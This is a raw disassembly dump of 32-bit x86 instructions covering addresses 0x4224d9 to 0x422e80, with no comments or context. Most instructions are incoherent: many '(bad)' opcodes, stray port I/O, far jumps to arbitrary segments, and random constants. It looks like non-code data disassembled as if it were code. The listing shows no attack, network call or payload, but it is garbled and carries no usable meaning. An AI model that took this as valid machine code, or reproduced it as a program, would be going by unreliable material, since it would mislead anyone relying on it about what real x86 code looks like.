  4224d9:	arpl   WORD PTR [edx+0x5a8a0222],di
  4224df:	sub    dh,BYTE PTR [edx]
  4224e1:	div    DWORD PTR [esi-0x41]
  4224e4:	xchg   DWORD PTR [esi-0x7988735e],ebx
  4224ea:	shr    BYTE PTR [ebx+0x18],cl
  4224ed:	fnsave ds:0xe6e9fd2
  4224f3:	pop    edx
  4224f4:	xor    al,BYTE PTR [esi+0x5ac95338]
  4224fa:	mov    cs,esp
  4224fc:	in     eax,dx
  4224fd:	mov    dl,0xbf
  4224ff:	sbb    DWORD PTR [esi-0x29],eax
  422502:	popa   
  422503:	data16 mov dh,0x5
  422506:	jmp    0xe315:0x78b53c08
  42250d:	scas   al,BYTE PTR es:[edi]
  42250e:	and    BYTE PTR [ebx-0x45],al
  422511:	add    al,0x99
  422513:	arpl   WORD PTR [ebp-0x60],dx
  422516:	xchg   ebx,eax
  422517:	mov    dh,0xe9
  422519:	repnz dec eax
  42251b:	call   0x1bc7b172
  422520:	cmp    BYTE PTR [edi],cl
  422522:	sbb    eax,0x84343a26
  422527:	pop    ds
  422528:	pop    edi
  422529:	push   0x11
  42252b:	sub    al,0x2
  42252d:	adc    eax,DWORD PTR [edx-0x347b875d]
  422533:	pop    ecx
  422534:	inc    eax
  422535:	dec    ecx
  422536:	popa   
  422537:	lahf   
  422538:	and    BYTE PTR [esi+ecx*8+0x4ce969cb],bh
  42253f:	(bad)  
  422540:	in     eax,dx
  422541:	mov    ebp,?
  422543:	outs   dx,DWORD PTR ds:[esi]
  422544:	sbb    dl,ch
  422546:	jns    0x4224f8
  422548:	mov    cl,0x7e
  42254a:	jbe    0x422508
  42254c:	inc    esp
  42254d:	and    BYTE PTR ds:0xa76f928a,dl
  422553:	cdq    
  422554:	pop    ss
  422555:	cdq    
  422556:	addr16 pop ebp
  422558:	cmp    bh,al
  42255a:	out    0x93,al
  42255c:	aad    0xeb
  42255e:	pop    eax
  42255f:	sahf   
  422560:	clc    
  422561:	pop    esp
  422562:	das    
  422563:	sbb    BYTE PTR [edx+0x11],al
  422566:	sbb    dl,BYTE PTR es:[edi-0x4b7612e9]
  42256d:	pop    ds
  42256e:	cmp    eax,DWORD PTR [edx]
  422570:	mov    DWORD PTR [edi+0x5e22ae27],edx
  422576:	ja     0x422585
  422578:	(bad)  
  422579:	sub    ecx,DWORD PTR [ebp+0x5c]
  42257c:	adc    bl,ah
  42257e:	(bad)  
  42257f:	shl    BYTE PTR [eax+0x10e227b8],0xa1
  422586:	xor    ebp,ebx
  422588:	jle    0x422571
  42258a:	pop    eax
  42258b:	das    
  42258c:	rol    ch,1
  42258e:	loop   0x42260b
  422590:	popf   
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x3fa8a2f8]
  422602:	dec    ecx
  422603:	dec    ecx
  422604:	fisubr WORD PTR [esi+0x1]
  422607:	add    BYTE PTR ds:0xe000001,al
  42260d:	pop    ebp
  42260e:	das    
  42260f:	xor    ebp,DWORD PTR [edi+0x47975a68]
  422615:	jecxz  0x422694
  422617:	push   esp
  422618:	sub    BYTE PTR [ebx],cl
  42261a:	mov    ds:0x6482a3bc,eax
  42261f:	out    dx,eax
  422620:	add    edi,DWORD PTR [ebp+edi*2+0x1917b8a6]
  422627:	inc    ecx
  422628:	loop   0x422660
  42262a:	or     cl,BYTE PTR [eax]
  42262c:	inc    eax
  42262d:	ja     0x4225c8
  42262f:	aaa    
  422630:	cs or  cl,bh
  422633:	add    al,0x15
  422635:	retf   0x40e8
  422638:	or     DWORD PTR [edi],edx
  42263a:	fistp  DWORD PTR [ebp-0x40454e3e]
  422640:	mov    ebx,DWORD PTR ds:0x9b9774f1
  422646:	rol    dl,cl
  422648:	(bad)  
  422649:	xor    eax,0xf6f74dbd
  42264e:	cmp    cl,BYTE PTR [esp+eiz*8+0x74]
  422652:	into   
  422653:	inc    ebp
  422654:	or     DWORD PTR ss:[ecx],0xffffffec
  422658:	mov    edx,0xc277ccce
  42265d:	fsubp  st(2),st
  42265f:	mov    edx,0xb0cde53e
  422664:	sub    BYTE PTR [edx+edi*4],dl
  422667:	mov    ds:0xdd73eab7,eax
  42266c:	or     esp,DWORD PTR [edi+0x79a94f51]
  422672:	clc    
  422673:	mov    dl,0x7a
  422675:	lds    esi,FWORD PTR [ecx-0xf]
  422678:	mov    DWORD PTR [edi+0x38],0x566f69b
  42267f:	add    BYTE PTR [ebp+0x1ac4fb8b],bl
  422685:	xchg   ecx,eax
  422686:	push   ecx
  422687:	push   eax
  422688:	pop    edx
  422689:	call   0x73fd1271
  42268e:	sar    BYTE PTR [eax+0x1f9e6ee5],0x8f
  422695:	rcr    DWORD PTR [edi-0x77],0x58
  422699:	or     DWORD PTR [esi+0x54],ebp
  42269c:	and    DWORD PTR [ebx-0x48ec1dbb],ecx
  4226a2:	(bad)  
  4226a3:	(bad)  
  4226a4:	out    dx,al
  4226a5:	mov    al,0x35
  4226a7:	loopne 0x422727
  4226a9:	jo     0x4226c0
  4226ab:	xchg   ebx,eax
  4226ac:	xchg   esi,eax
  4226ad:	lods   al,BYTE PTR ds:[esi]
  4226ae:	inc    ebx
  4226af:	hlt    
  4226b0:	sbb    DWORD PTR [ecx+0x34746772],edi
  4226b6:	mov    ebp,0x56144dcc
  4226bb:	jne    0x42272a
  4226bd:	icebp  
  4226be:	pop    edx
  4226bf:	mov    ds:0x2660e2dd,al
  4226c4:	push   ebx
  4226c5:	xor    ebp,ebp
  4226c7:	clc    
  4226c8:	pop    esp
  4226c9:	mov    dh,0x4
  4226cb:	mov    esp,DWORD PTR [ecx]
  4226cd:	jge    0x4226bc
  4226cf:	pop    es
  4226d0:	daa    
  4226d1:	aad    0x67
  4226d3:	add    dl,BYTE PTR [ebp-0x34c1aff5]
  4226d9:	push   edx
  4226da:	ret    0x96d
  4226dd:	mov    ah,0xb7
  4226df:	push   ss
  4226e0:	inc    edi
  4226e1:	add    al,0x32
  4226e3:	jns    0x422679
  4226e5:	sub    DWORD PTR [esi],esi
  4226e7:	xor    edi,DWORD PTR [edi+0x12]
  4226ea:	mov    al,ds:0x6eacbd84
  4226ef:	xor    al,0x44
  4226f1:	retf   0xcb20
  4226f4:	push   0x6ed3ec2
  4226f9:	mov    ecx,0xb16d526
  4226fe:	dec    esp
  4226ff:	andnps xmm3,xmm2
  422702:	push   esi
  422703:	lods   al,BYTE PTR ds:[esi]
  422704:	mov    ecx,0x2621ddf4
  422709:	das    
  42270a:	and    al,0x13
  42270c:	inc    edi
  42270d:	adc    bh,al
  42270f:	lea    eax,[ebx+0x0]
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x117f01c8
  422781:	lods   al,BYTE PTR ds:[esi]
  422782:	pushf  
  422783:	push   ebx
  422784:	jecxz  0x4227f5
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0x3b000001
  42278d:	(bad)  [ecx]
  42278f:	jno    0x422725
  422791:	mov    cl,0x58
  422793:	jae    0x42273d
  422795:	pop    ecx
  422796:	jnp    0x42271b
  422798:	xor    ah,BYTE PTR [ebx]
  42279a:	stc    
  42279b:	ss jmp 0x4227a4
  42279e:	inc    edx
  42279f:	adc    BYTE PTR [ecx],dh
  4227a1:	push   ds
  4227a2:	loop   0x422738
  4227a4:	push   edx
  4227a5:	sub    al,0xb9
  4227a7:	adc    al,0xa3
  4227a9:	and    al,al
  4227ab:	xchg   esp,eax
  4227ac:	pop    esi
  4227ad:	es inc edx
  4227af:	fmul   DWORD PTR [esi-0x5d41f7ee]
  4227b5:	fsubr  QWORD PTR [edi]
  4227b7:	ret    
  4227b8:	xor    eax,0x90e28a3
  4227bd:	arpl   ax,sp
  4227bf:	popa   
  4227c0:	(bad)  
  4227c1:	cmp    DWORD PTR [esi-0x1d],edx
  4227c4:	outs   dx,BYTE PTR ds:[esi]
  4227c5:	fs loop 0x422795
  4227c8:	test   BYTE PTR [ecx+0x70],bl
  4227cb:	shr    bh,cl
  4227cd:	inc    edi
  4227ce:	loopne 0x422788
  4227d0:	jmp    0x4227c6
  4227d2:	(bad)  
  4227d3:	cdq    
  4227d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d5:	jecxz  0x422856
  4227d7:	mov    bl,0x47
  4227d9:	rcl    DWORD PTR [ecx-0x7e392c64],cl
  4227df:	bound  ebp,QWORD PTR [eax-0x2294290d]
  4227e5:	call   0x933c14f9
  4227ea:	jbe    0x42281e
  4227ec:	or     BYTE PTR [edx+0x7f],dh
  4227ef:	add    al,BYTE PTR [edx+0x7b5309ab]
  4227f5:	or     ch,BYTE PTR [edx]
  4227f7:	repnz cwde 
  4227f9:	iret   
  4227fa:	sbb    al,0x3
  4227fc:	dec    ecx
  4227fd:	add    ebp,edi
  4227ff:	inc    ebx
  422800:	jmp    0x28ab3f05
  422805:	lods   al,BYTE PTR ds:[esi]
  422806:	push   ss
  422807:	push   ss
  422808:	hlt    
  422809:	pop    es
  42280a:	jmp    0x4227b4
  42280c:	add    al,0x7e
  42280e:	loopne 0x42282e
  422810:	mov    esi,0x4e06dda0
  422815:	lods   al,BYTE PTR ds:[esi]
  422816:	shl    bh,cl
  422818:	adc    al,0x1c
  42281a:	mov    edi,0xc3d0035a
  42281f:	ror    BYTE PTR [esi-0x72bfccf1],1
  422825:	mov    edi,0xd6165a89
  42282a:	(bad)  
  42282b:	xor    BYTE PTR [ecx+edx*2-0x61],bl
  42282f:	(bad)  
  422830:	xchg   ebx,eax
  422831:	out    dx,al
  422832:	leave  
  422833:	mov    WORD PTR [eax],es
  422835:	inc    esp
  422836:	mov    al,0xe2
  422838:	sub    ebx,ebp
  42283a:	stos   DWORD PTR es:[edi],eax
  42283b:	push   ecx
  42283c:	shl    BYTE PTR [edx],0xfe
  42283f:	clc    
  422840:	lds    eax,FWORD PTR [ecx+0x42]
  422843:	xchg   edx,eax
  422844:	call   0x18d3:0x4c1da153
  42284b:	pop    esp
  42284c:	gs es or eax,0x5a48a61b
  422853:	into   
  422854:	jl     0x422869
  422856:	loope  0x422834
  422858:	push   ds
  422859:	stos   DWORD PTR es:[edi],eax
  42285a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42285b:	iret   
  42285c:	aad    0xeb
  42285e:	arpl   bx,sp
  422860:	jbe    0x422886
  422862:	xlat   BYTE PTR ds:[ebx]
  422863:	das    
  422864:	ins    BYTE PTR es:[edi],dx
  422865:	mov    dh,0x97
  422867:	ins    DWORD PTR es:[edi],dx
  422868:	lods   al,BYTE PTR ds:[esi]
  422869:	(bad)  
  42286a:	ror    BYTE PTR [edx+0x72],cl
  42286d:	iret   
  42286e:	aam    0x6
  422870:	cmp    BYTE PTR [esi-0x7],bh
  422873:	(bad)  
  422874:	dec    esi
  422875:	cwde   
  422876:	inc    edx
  422877:	cld    
  422878:	xor    dl,BYTE PTR [ebp-0x25b2b1ac]
  42287e:	jg     0x422840
  422880:	add    DWORD PTR [ecx],eax
  422882:	xor    esi,DWORD PTR [ebp-0x35]
  422885:	out    dx,eax
  422886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422887:	lods   eax,DWORD PTR ds:[esi]
  422888:	test   al,0x26
  42288a:	push   ecx
  42288b:	mov    al,ds:0x25ba3767
  422890:	inc    ebp
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x42291b
  422901:	push   esp
  422902:	push   edx
  422903:	push   esi
  422904:	call   0x5422a79
  422909:	add    DWORD PTR [eax],eax
  42290b:	add    BYTE PTR [ebp-0x7e19b8be],ah
  422911:	inc    ecx
  422912:	and    eax,0x3aeb552c
  422917:	sub    ah,BYTE PTR [eax-0x6]
  42291a:	cmp    eax,eax
  42291c:	pop    eax
  42291d:	sub    DWORD PTR [ebp+0x38edbc3e],ebp
  422923:	cmp    eax,edi
  422925:	fs pusha 
  422927:	loop   0x4229a1
  422929:	lock shr DWORD PTR [ebx-0x2fc51171],1
  422930:	inc    edi
  422931:	in     eax,dx
  422932:	jo     0x422936
  422934:	aad    0x94
  422936:	inc    eax
  422937:	out    dx,eax
  422938:	(bad)  
  422939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42293a:	xchg   bl,cl
  42293c:	mov    edi,0xb57190b2
  422941:	ds and al,0xee
  422944:	xor    ecx,DWORD PTR [eax-0x15c03cfe]
  42294a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42294b:	sub    BYTE PTR [ecx+0x22cb9b5f],cl
  422951:	loopne 0x4228e8
  422953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422954:	in     eax,dx
  422955:	pop    ds
  422956:	shr    DWORD PTR [ebx+0x29],0xfa
  42295a:	dec    ecx
  42295b:	cmc    
  42295c:	mov    ebx,0xea29c68d
  422962:	ret    0x47ba
  422965:	dec    ebx
  422966:	outs   dx,BYTE PTR ds:[esi]
  422967:	pushf  
  422968:	inc    esi
  422969:	inc    ebx
  42296a:	pop    edi
  42296b:	add    al,0x55
  42296d:	lahf   
  42296e:	fs ss xchg esi,eax
  422971:	inc    ebp
  422972:	pop    esp
  422973:	or     cl,BYTE PTR [ebx-0x3d]
  422976:	inc    edi
  422977:	lahf   
  422978:	arpl   WORD PTR [ebx-0x68],ax
  42297b:	dec    ebx
  42297c:	pop    esi
  42297d:	sub    al,0x2
  42297f:	out    dx,eax
  422980:	enter  0xea95,0x14
  422984:	dec    esp
  422985:	test   eax,0x7b524c73
  42298a:	std    
  42298b:	dec    esp
  42298c:	repnz int 0x70
  42298f:	(bad)  
  422990:	cmp    dh,bh
  422992:	leave  
  422993:	jp     0x422937
  422995:	xchg   DWORD PTR [ecx+0xbde55b4],ebx
  42299b:	je     0x422968
  42299d:	dec    edx
  42299e:	loop   0x422949
  4229a0:	mov    ch,0x31
  4229a2:	je     0x422943
  4229a4:	test   BYTE PTR [ebx+0x56],bl
  4229a7:	out    0xa4,eax
  4229a9:	lods   al,BYTE PTR ds:[esi]
  4229aa:	push   ebx
  4229ab:	bound  eax,QWORD PTR [ebx+0x3f]
  4229ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229af:	push   ss
  4229b0:	pushf  
  4229b1:	add    al,0x1d
  4229b3:	mov    ah,BYTE PTR [ebx-0xa]
  4229b6:	xchg   ebp,eax
  4229b7:	adc    DWORD PTR [ebx],ebx
  4229b9:	pop    esp
  4229ba:	cld    
  4229bb:	adc    BYTE PTR ds:0x4b69f249,0x4c
  4229c2:	add    cl,BYTE PTR ds:0xf094faec
  4229c8:	and    BYTE PTR [ecx-0x37],dh
  4229cb:	nop
  4229cc:	cmp    dh,cl
  4229ce:	inc    ebp
  4229cf:	int    0xf6
  4229d1:	and    ah,dl
  4229d3:	or     bh,BYTE PTR fs:[ebx]
  4229d6:	xchg   esi,eax
  4229d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229d8:	cdq    
  4229d9:	jl     0x422a01
  4229db:	repz std 
  4229dd:	vorpd  ymm1,ymm5,YMMWORD PTR [eax]
  4229e1:	fwait
  4229e2:	push   ebx
  4229e3:	(bad)  
  4229e4:	aas    
  4229e5:	mov    ecx,0x450ef939
  4229ea:	pop    esp
  4229eb:	or     DWORD PTR [edx-0x6c7486],eax
  4229f1:	inc    eax
  4229f2:	daa    
  4229f3:	int    0x26
  4229f5:	xchg   ecx,eax
  4229f6:	mov    dl,0x88
  4229f8:	ret    0x9074
  4229fb:	es retf 
  4229fd:	dec    ecx
  4229fe:	stos   BYTE PTR es:[edi],al
  4229ff:	xchg   edx,eax
  422a00:	and    al,0xa4
  422a02:	sahf   
  422a03:	mov    dh,0x4f
  422a05:	inc    edx
  422a06:	int3   
  422a07:	fiadd  DWORD PTR [ebp-0x241f11aa]
  422a0d:	rcl    esp,0x4a
  422a10:	jno    0x422a12
	...
  422a72:	add    BYTE PTR [eax],al
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	dec    ebx
  422a81:	ins    DWORD PTR es:[edi],dx
  422a82:	das    
  422a83:	loope  0x422a72
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0x8c000001,al
  422a8d:	xor    BYTE PTR [ebx+ebx*8-0x43],0xc1
  422a92:	ror    BYTE PTR [ebx],cl
  422a94:	jns    0x422ad2
  422a96:	out    0x6b,al
  422a98:	add    eax,0x26a7cb64
  422a9d:	cld    
  422a9e:	je     0x422a7f
  422aa0:	mov    ebx,DWORD PTR [edi-0x5c]
  422aa3:	dec    ebx
  422aa4:	or     edx,DWORD PTR [edi+0xfc6ca64]
  422aaa:	test   DWORD PTR [esi+0x5068c666],edi
  422ab0:	(bad)  
  422ab1:	fst    DWORD PTR [ebp+0x42]
  422ab4:	inc    esp
  422ab5:	sbb    DWORD PTR [ebx],ecx
  422ab7:	imul   edx,DWORD PTR [edi],0x6b
  422aba:	ret    
  422abb:	loopne 0x422ac4
  422abd:	mov    ch,0x98
  422abf:	dec    edx
  422ac0:	sbb    BYTE PTR [ebp+ebx*4+0x735f6750],bl
  422ac7:	data16 (bad) 
  422ac9:	jg     0x422b08
  422acb:	fs jno 0x422b0d
  422ace:	mov    dl,0xc7
  422ad0:	inc    esi
  422ad1:	outs   dx,DWORD PTR ds:[esi]
  422ad2:	stos   DWORD PTR es:[edi],eax
  422ad3:	mov    edx,0x814a1f27
  422ad8:	mov    DWORD PTR [ebx-0x15da0c2e],esp
  422ade:	mov    ss,ebp
  422ae0:	daa    
  422ae1:	push   ecx
  422ae2:	fucomi st,st(6)
  422ae4:	push   0x165c209
  422ae9:	or     DWORD PTR [ebp+0x56096925],ebp
  422aef:	pop    edx
  422af0:	xchg   DWORD PTR [ecx],ebp
  422af2:	dec    edi
  422af3:	xor    esi,ebp
  422af5:	pop    es
  422af6:	shl    ah,1
  422af8:	adc    dl,0x5
  422afb:	fsub   QWORD PTR [ecx]
  422afd:	jnp    0x422b12
  422aff:	inc    ecx
  422b00:	in     al,dx
  422b01:	pusha  
  422b02:	dec    esp
  422b03:	rcl    ebp,1
  422b05:	inc    edx
  422b06:	push   0x52
  422b08:	outs   dx,BYTE PTR ds:[esi]
  422b09:	fcmovnbe st,st(4)
  422b0b:	mov    DWORD PTR [ebx],ecx
  422b0d:	mov    eax,ds:0xa7e87969
  422b12:	add    edi,DWORD PTR [ebx+0x78]
  422b15:	clc    
  422b16:	stc    
  422b17:	pop    esp
  422b18:	call   0xcd174ad4
  422b1d:	mov    al,ds:0xa3d6ad67
  422b22:	xchg   ecx,eax
  422b23:	inc    ebp
  422b24:	dec    esi
  422b25:	inc    edi
  422b26:	and    BYTE PTR [edi+eiz*8-0x36fb9f59],bh
  422b2d:	add    edi,DWORD PTR [eax+0x1e]
  422b30:	(bad)  
  422b31:	dec    esi
  422b32:	cld    
  422b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b34:	pusha  
  422b35:	fdiv   st,st(5)
  422b37:	outs   dx,BYTE PTR ds:[esi]
  422b38:	inc    eax
  422b39:	xchg   edx,eax
  422b3a:	stos   BYTE PTR es:[edi],al
  422b3b:	pop    ds
  422b3c:	pop    es
  422b3d:	add    DWORD PTR [ebp-0x11264000],0x7b
  422b44:	gs js  0x422b45
  422b47:	ror    edi,0x4d
  422b4a:	sbb    eax,0x4a4f3583
  422b4f:	mov    ch,0x53
  422b51:	icebp  
  422b52:	jb     0x422b30
  422b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b55:	pop    esp
  422b56:	stos   DWORD PTR es:[edi],eax
  422b57:	push   edx
  422b58:	or     al,0x8a
  422b5a:	pushf  
  422b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b5c:	jae    0x422af4
  422b5e:	cwde   
  422b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b60:	pop    es
  422b61:	push   esi
  422b62:	or     edx,DWORD PTR [ebp+0x330b3d64]
  422b68:	mov    BYTE PTR [ecx-0x5e],dh
  422b6b:	fcmove st,st(4)
  422b6d:	push   edi
  422b6e:	dec    DWORD PTR [esi]
  422b70:	mov    ebp,0xdfb744f
  422b75:	and    BYTE PTR [ebx],cl
  422b77:	jmp    DWORD PTR [ecx+ebx*4-0x50]
  422b7b:	jl     0x422b0c
  422b7d:	sub    BYTE PTR [edx],al
  422b7f:	sub    al,0x0
  422b81:	dec    esi
  422b82:	int3   
  422b83:	in     eax,dx
  422b84:	mov    ah,0xd1
  422b86:	adc    DWORD PTR [ebp+0x79247508],0xfc2cf32d
  422b90:	mov    BYTE PTR [eax],al
	...
  422bf2:	add    BYTE PTR [eax],al
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x2334d9c]
  422c02:	inc    edx
  422c03:	jmp    0x439efa
  422c08:	add    eax,0xf6000001
  422c0d:	dec    ebp
  422c0e:	mov    cl,0x2e
  422c11:	add    bh,BYTE PTR [edi+0xb5a4071]
  422c17:	xor    al,0x76
  422c19:	jmp    0x3352:0x89f0382c
  422c20:	imul   ebx,DWORD PTR [eax],0x1b9fb31b
  422c26:	jnp    0x422c98
  422c28:	adc    al,0x12
  422c2a:	mov    esi,0x60d30723
  422c2f:	mov    esi,esp
  422c31:	mov    al,ds:0xdaf0fdb7
  422c36:	out    dx,eax
  422c37:	loopne 0x422c3f
  422c39:	inc    eax
  422c3a:	xor    eax,0xf0e2df9c
  422c3f:	or     BYTE PTR [eax+0x2c],ah
  422c42:	fcomp  st(4)
  422c44:	fs out 0xc8,eax
  422c47:	lahf   
  422c48:	(bad)  
  422c49:	sbb    al,0x4d
  422c4b:	pushf  
  422c4c:	das    
  422c4d:	xchg   ebp,eax
  422c4e:	and    cl,BYTE PTR [ecx+ecx*4+0x46ba6600]
  422c55:	push   ecx
  422c56:	mov    bl,0x2b
  422c58:	xor    ch,BYTE PTR [ebx+0x17]
  422c5b:	fisubr WORD PTR [esi]
  422c5d:	loope  0x422bf9
  422c5f:	sbb    edi,DWORD PTR [esi-0x4f8294f6]
  422c65:	sub    DWORD PTR [edx+0x54],esi
  422c68:	and    al,0xc1
  422c6a:	icebp  
  422c6b:	xchg   ecx,eax
  422c6c:	rcr    eax,cl
  422c6e:	shr    DWORD PTR [eax],0x6f
  422c71:	mov    ds:0xbfdef010,eax
  422c76:	ins    BYTE PTR es:[edi],dx
  422c77:	rcr    DWORD PTR [ecx+0x50d85beb],1
  422c7d:	in     al,dx
  422c7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c7f:	test   al,0x11
  422c81:	add    DWORD PTR [esi-0x20],edx
  422c84:	inc    eax
  422c85:	xor    edx,ebp
  422c87:	xchg   esp,eax
  422c88:	js     0x422cf7
  422c8a:	dec    edx
  422c8b:	inc    eax
  422c8c:	sub    eax,0xf4e0d788
  422c91:	inc    ebp
  422c92:	stc    
  422c93:	sbb    cl,BYTE PTR [edi+0x3de87cf6]
  422c99:	or     eax,0xfe0c7e7c
  422c9e:	repnz push ss
  422ca0:	sbb    esp,DWORD PTR [edx+0x74]
  422ca3:	cwde   
  422ca4:	addr16 mov esi,0xb7dc8637
  422caa:	lahf   
  422cab:	and    BYTE PTR ds:0x6ac2677f,cl
  422cb1:	inc    ecx
  422cb2:	xchg   esi,eax
  422cb3:	ins    BYTE PTR es:[edi],dx
  422cb4:	mov    ah,0x12
  422cb6:	nop
  422cb7:	pop    edi
  422cb8:	push   ds
  422cb9:	repz pop ebp
  422cbb:	dec    esi
  422cbc:	aaa    
  422cbd:	adc    al,0xa
  422cbf:	inc    ecx
  422cc0:	gs push ebp
  422cc2:	scas   al,BYTE PTR es:[edi]
  422cc3:	mov    bh,0x23
  422cc5:	pusha  
  422cc6:	imul   edi,DWORD PTR [edx+ecx*4-0x3a8f359c],0xc2f0c321
  422cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cd2:	out    dx,al
  422cd3:	xchg   si,ax
  422cd5:	js     0x422d55
  422cd7:	nop
  422cd8:	popf   
  422cd9:	push   esp
  422cda:	add    BYTE PTR [eax],bh
  422cdc:	inc    eax
  422cdd:	add    DWORD PTR [esi+0x5739d3c4],edx
  422ce3:	jnp    0x422c77
  422ce5:	scas   eax,DWORD PTR es:[edi]
  422ce6:	jo     0x422d5d
  422ce8:	fcmovnbe st,st(3)
  422cea:	loopne 0x422d45
  422cec:	mov    es,WORD PTR [esi+0x765b7f98]
  422cf2:	aam    0x14
  422cf4:	lock mov BYTE PTR [esi*1-0x30359ba7],dh
  422cfc:	mov    edx,0x7184fa7e
  422d01:	test   BYTE PTR [eax+edx*8],cl
  422d04:	adc    bh,BYTE PTR [edx]
  422d06:	ss mov al,ah
  422d09:	lods   al,BYTE PTR ds:[esi]
  422d0a:	ins    BYTE PTR es:[edi],dx
  422d0b:	mov    edi,0x6ed40218
  422d10:	loop   0x422d12
	...
  422d72:	add    BYTE PTR [eax],al
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    edx,DWORD PTR [edx-0x846c9bc]
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR ds:0x9f000001,al
  422d8d:	sub    DWORD PTR [eax-0x61013b4b],ebp
  422d93:	fdiv   DWORD PTR [edx-0x5e498bdb]
  422d99:	add    ch,dl
  422d9b:	or     al,BYTE PTR [edx]
  422d9d:	xchg   edx,eax
  422d9e:	leave  
  422d9f:	not    BYTE PTR [edx]
  422da1:	mov    ebx,0x4e584c6e
  422da6:	(bad)  
  422da7:	loope  0x422deb
  422da9:	inc    eax
  422daa:	ds inc esi
  422dac:	pop    ds
  422dad:	aad    0xaf
  422daf:	mov    ah,0x58
  422db1:	lds    ebx,FWORD PTR [edx-0xf1f8bdd]
  422db7:	mov    cl,cl
  422db9:	mov    eax,ds:0xfd623cef
  422dbe:	fsin   
  422dc0:	pop    eax
  422dc1:	pop    ss
  422dc2:	mov    esp,0x32b016a1
  422dc7:	pop    ebp
  422dc8:	out    0x9c,al
  422dca:	cwde   
  422dcb:	mov    al,ds:0xc5eb3ac1
  422dd0:	(bad)  
  422dd1:	dec    esi
  422dd2:	fldcw  WORD PTR [eax+0x70]
  422dd5:	popf   
  422dd6:	outs   dx,DWORD PTR ds:[esi]
  422dd7:	jmp    0x5fa7:0x8032dad0
  422dde:	inc    esp
  422ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422de0:	mov    ah,0xe4
  422de2:	adc    edx,DWORD PTR [ecx]
  422de4:	popw   ds
  422de6:	xchg   DWORD PTR [ebx],edi
  422de8:	pop    ebp
  422de9:	test   BYTE PTR ds:0xcacdf2cb,bh
  422def:	test   ebx,edx
  422df1:	rcr    ebx,1
  422df3:	ror    DWORD PTR [ebp+0x1a],cl
  422df6:	(bad)  
  422df7:	pop    edi
  422df8:	inc    esi
  422df9:	sub    ebp,DWORD PTR [eax]
  422dfb:	shl    DWORD PTR [esi],0xfe
  422dfe:	add    BYTE PTR [edx-0x19],al
  422e01:	(bad)  
  422e02:	jns    0x422e5d
  422e04:	pusha  
  422e05:	cmc    
  422e06:	xor    ebx,esp
  422e08:	cmp    eax,0x747d30cc
  422e0d:	push   esp
  422e0e:	ret    
  422e0f:	and    BYTE PTR [ecx],dl
  422e11:	xor    ebx,ecx
  422e13:	daa    
  422e14:	jo     0x422e86
  422e16:	scas   al,BYTE PTR es:[edi]
  422e17:	xlat   BYTE PTR ds:[ebx]
  422e18:	push   ebx
  422e19:	(bad)  
  422e1a:	lock mov edi,0x4054c4a0
  422e20:	daa    
  422e21:	cdq    
  422e22:	push   0xc9509847
  422e27:	int3   
  422e28:	dec    eax
  422e29:	cmc    
  422e2a:	sti    
  422e2b:	mov    ebp,0x81d3213f
  422e30:	adc    esp,esi
  422e32:	lds    eax,FWORD PTR [ecx-0x1a]
  422e35:	sub    cl,BYTE PTR ds:0x84acf5cc
  422e3b:	(bad)  
  422e3c:	mov    esp,0x747a2590
  422e41:	sub    al,BYTE PTR [ebx]
  422e43:	jmp    0x422dfd
  422e45:	imul   esp,edx,0x31
  422e48:	int3   
  422e49:	mov    eax,0x58286020
  422e4e:	es adc al,0x11
  422e51:	inc    esp
  422e52:	ja     0x422e00
  422e54:	adc    ah,al
  422e56:	cmp    al,BYTE PTR [eax]
  422e58:	out    0x3c,al
  422e5a:	lods   al,BYTE PTR ds:[esi]
  422e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e5c:	push   cx
  422e5e:	sbb    edi,DWORD PTR [edi+0x6aaf1e22]
  422e64:	xchg   BYTE PTR es:[edx-0x7a934453],ch
  422e6b:	call   0x6807860
  422e70:	inc    edi
  422e71:	leave  
  422e72:	lock ss stos BYTE PTR es:[edi],al
  422e75:	imul   edx,DWORD PTR ds:0x5619cb97,0xffffffd5
  422e7c:	dec    ebp
  422e7d:	(bad)  
  422e7e:	cli    
  422e7f:	ins    BYTE PTR es:[edi],dx
  422e80:	dec    ecx
